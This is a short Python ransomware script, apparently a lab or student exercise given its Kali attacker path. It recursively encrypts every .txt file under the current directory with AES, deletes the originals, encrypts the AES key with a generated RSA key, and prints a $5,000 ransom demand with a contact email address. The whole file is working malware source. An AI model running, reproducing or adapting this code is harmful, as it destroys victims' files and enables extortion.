import glob
import os, random, struct
from Cryptodome.Cipher import AES
import sys
from Crypto.Cipher import PKCS1_OAEP

from Crypto import Random
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from base64 import b64encode
from base64 import b64decode
from Crypto.Util.py3compat import *

def encrypt_file(key, in_filename, out_filename=None):
    if not out_filename:
        out_filename = in_filename + '.enc'
    iv = '0pXvAAg0oqRpVJHm6QgwBQ=='
    iv = b64decode(iv)
    cipher = AES.new(key ,AES.MODE_CBC, iv)
    
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            data = infile.read(filesize)
            ct_bytes = cipher.encrypt(pad(data, AES.block_size))
            ct = b64encode(ct_bytes)
            outfile.write(ct)


def enc_key(AESKEY):
    key = RSA.generate(2048)
    private_key = key.export_key()
    file_out = open("/home/kali/attacker/private.pem", "wb")
    file_out.write(private_key)
    file_out.close()

    public_key = key.publickey().export_key()
    file_out = open("./receiver.pem", "wb")
    file_out.write(public_key)
    file_out.close()

    f = open("./receiver.pem", 'rb')
    recipent_key = RSA.import_key(f.read())
    file_out = open("./key.bin", "wb")
    cipher_rsa = PKCS1_OAEP.new(recipent_key)
    enc_data = cipher_rsa.encrypt(AESKEY)
    file_out.write(enc_data)
    file_out.close()

def main():
    key = get_random_bytes(16)
    startPath = './**'

#Encrypts all files recursively starting from startPath
    for filename in glob.iglob(startPath, recursive=True):
        if(os.path.isfile(filename)):
            fname, ext = os.path.splitext(filename)
            if (ext == '.txt'):
                encrypt_file(key, filename)
                os.remove(filename)
    print("Your text files are encrypted.")
    print("To decrypt them, you need to pay me $5,000 and send key.bin in your folder to ziyun1612@ewhain.net")
    enc_key(key)

main()
    
    


	





	
